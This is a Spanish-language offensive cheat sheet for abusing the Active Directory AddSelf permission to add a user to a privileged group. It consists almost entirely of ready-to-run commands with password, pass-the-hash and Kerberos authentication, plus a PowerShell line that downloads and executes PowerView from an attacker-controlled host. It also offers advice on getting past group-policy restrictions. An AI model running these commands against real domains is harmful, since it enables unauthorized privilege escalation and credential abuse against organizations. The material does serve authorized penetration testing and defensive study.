## Abuso de AddSelf

Si un usuario tiene `AddSelf` sobre un grupo, puede añadirse a sí mismo dentro de ese grupo sin necesidad de permisos adicionales.

---

## Desde Linux (externamente — recomendado)

### Con credenciales estándar

```shell
# Samba tools
net rpc group addmem '<grupo_objetivo>' '<usuario_objetivo>' \
  -U '<dominio>'/'<usuario_controlado>'%'<contraseña>' -S '<ip_dc>'

# BloodyAD
bloodyAD --host '<ip_dc>' -d '<dominio>' -u '<usuario>' -p '<contraseña>' \
  add groupMember '<grupo>' '<usuario>'

# ldap_shell
ldap_shell <dominio>/<usuario>:<contraseña> -dc-ip <ip>
add_user_to_group <usuario> <grupo>
```

### Con Pass-the-Hash

```shell
# Samba tools
pth-net rpc group addmem '<grupo_objetivo>' '<usuario_objetivo>' \
  -U '<dominio>'/'<usuario_controlado>'%'LMhash':'NThash' -S '<ip_dc>'

# BloodyAD
bloodyAD --host '<ip_dc>' -d '<dominio>' -u '<usuario>' -p ':<hash_nt>' \
  add groupMember '<grupo>' '<usuario>'

# ldap_shell
ldap_shell '<dominio>/<usuario>:' -hashes ffffffffffffffffffffffffffffffff:<hash_nt> -dc-ip <ip>
add_user_to_group <usuario> <grupo>
```

### Con autenticación Kerberos

```shell
# ldap_shell
getTGT.py <dominio>/<usuario>:<contraseña>
export KRB5CCNAME=<nombre_ticket>
ldap_shell '<dominio>/<usuario>:<contraseña>' -dc-host <maquina.dominio> -k
add_user_to_group <usuario> <grupo>

# BloodyAD
getTGT.py <dominio>/<usuario>:<contraseña>
export KRB5CCNAME=<nombre_ticket>
bloodyAD --host '<ip_dc>' -d '<dominio>' -u '<usuario>' -k --host <maquina.dominio> \
  add groupMember '<grupo>' '<usuario_a_añadir>'
```

---

## Desde Windows (internamente)

```powershell
# Comando nativo
net group <grupo> <usuario> /add /domain

# Módulo de Active Directory (PowerShell)
Add-ADGroupMember -Identity '<grupo>' -Members '<usuario>'

# Con PowerView
IEX (new-object net.webclient).downloadstring('http://<ip_atacante>/powerview.ps1')
Add-DomainGroupMember -Identity '<grupo>' -Members '<usuario>'
```

> 💡 Si `net group` falla por restricciones de directiva de grupo, intentar con el módulo de AD o PowerView — suelen funcionar incluso cuando los comandos nativos están bloqueados.

---

### Referencias

- https://www.hackingarticles.in/addself-active-directory-abuse/
- https://bloodhound.specterops.io/resources/edges/add-self
